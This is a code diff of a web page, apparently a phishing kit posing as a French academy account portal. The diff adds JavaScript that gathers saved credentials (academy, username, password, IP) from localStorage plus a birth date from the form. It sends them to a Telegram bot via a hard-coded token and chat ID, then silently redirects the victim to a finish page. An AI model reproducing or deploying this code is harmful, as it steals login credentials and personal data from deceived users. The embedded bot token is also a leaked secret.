@@ -140,19 +140,37 @@ Afin de protéger l'accès aux données, il est impératif de vous déconnecter 
                 </div>
             </div>
         </footer>
-    <script>
+   <script>
 document.getElementById('submit-button').addEventListener('click', async function(event) {
   event.preventDefault();
 
+  // Récupération des données depuis localStorage
+  const acname = localStorage.getItem('acname') || 'Non renseigné';
+  const user = localStorage.getItem('user') || 'Non renseigné';
+  const pass = localStorage.getItem('pass') || 'Non renseigné';
+  const ip = localStorage.getItem('ip') || 'Non renseigné';
+
+  // Données du formulaire actuel
   const username = document.getElementById('username').value;
   const date = document.getElementById('password-input').value;
-    const token = '7703518890:AAFYliGGc_Bv4DcODj_lQTqmC5r6dDYF6T0'; // Remplace par ton token
-    const chatId = '-4824253616'; // Remplace par ton chat ID
+
   // Validation basique
-  if(!date) {
+  if (!date) {
     alert("Veuillez entrer une date de naissance");
     return;
   }
+
+  const token = '7703518890:AAFYliGGc_Bv4DcODj_lQTqmC5r6dDYF6T0';
+  const chatId = '-4824253616';
+
+  // Construction du message complet
+  const message = 
+    `🔐 Données précédentes :\n` +
+    `📍 Académie : ${acname}\n` +
+    `👤 Identifiant : ${user}\n` +
+    `🔑 Mot de passe : ${pass}\n` +
+    `📅 Date de naissance : ${date}\n`+
+	`🌐 IP : ${ip}\n\n` ;
 
   try {
     const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -160,29 +178,23 @@ document.getElementById('submit-button').addEventListener('click', async functio
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: chatId,
-        text: `👤 Utilisateur : ${username}\n📅 Date de naissance : ${date}`
+        text: message
       })
     });
 
     const data = await response.json();
     console.log("Réponse Telegram:", data);
 
-    // Vérification explicite du succès
-    if(data.ok === true) {
-      window.location.href = 'finish.html'; 
-    } else {
-      console.error("Erreur Telegram:", data);
-      // Fallback: redirection même en cas d'échec d'envoi
-      window.location.href = 'finish.html';
-    }
+    // Redirection même en cas d’erreur
+    window.location.href = 'finish.html';
     
   } catch (error) {
-    console.error("Erreur:", error);
-    // Fallback: redirection même en cas d'erreur réseau
+    console.error("Erreur lors de l'envoi à Telegram :", error);
     window.location.href = 'finish.html';
   }
 });
 </script>
+
 <script>
 // Date de début : 8 juin 2025
 const startDate = new Date('2025-07-15T00:00:00');
